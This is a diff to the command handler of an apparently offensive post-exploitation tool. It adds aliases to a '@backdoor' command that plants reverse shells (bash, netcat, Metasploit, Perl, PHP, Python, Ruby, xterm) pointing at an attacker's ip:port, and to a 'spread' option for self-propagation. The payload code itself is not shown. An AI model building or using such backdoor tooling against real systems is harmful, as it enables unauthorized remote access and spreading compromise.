@@ -71,32 +71,32 @@ class Commander(object):
                     elif command == '@banner':
                         print banner
 
-                    elif command.startswith('@backdoor'):
+                    elif command.startswith('@backdoor') or command.startswith('@bd'):
                         if len(command.split()) == 3:
                             ip = command.split()[2].split(':')[0]
                             port = command.split()[2].split(':')[1]
-                            if command.split()[1] == "bash":
+                            if command.split()[1] == "bash" or command.split()[1] == "sh":
                                 backdoor.bash(ip, port)
                             elif command.split()[1] == "java":
                                 backdoor.java(ip, port)
-                            elif command.split()[1] == "msf":
+                            elif command.split()[1] == "msf" or command.split()[1] == "metasploit":
                                 backdoor.msf(ip, port)
-                            elif command.split()[1] == "netcat":
+                            elif command.split()[1] == "netcat" or command.split()[1] == "nc":
                                 backdoor.netcat(ip, port)
-                            elif command.split()[1] == "perl":
+                            elif command.split()[1] == "perl" or command.split()[1] == "pl":
                                 backdoor.perl(ip, port)
                             elif command.split()[1] == "php":
                                 backdoor.php(ip, port)
-                            elif command.split()[1] == "python":
+                            elif command.split()[1] == "python" or command.split()[1] == "py":
                                 backdoor.python(ip, port)
-                            elif command.split()[1] == "ruby":
+                            elif command.split()[1] == "ruby" or command.split()[1] == "rb":
                                 backdoor.ruby(ip, port)
                             elif command.split()[1] == "xterm":
                                 backdoor.xterm(ip)
                             else:
                                 backdoor.list()
                         elif len(command.split()) == 2:
-                            if command.split()[1] == "spread":
+                            if command.split()[1] == "spread" or command.split()[1] == "self":
                                 backdoor.spread()
                             else:
                                 backdoor.list()
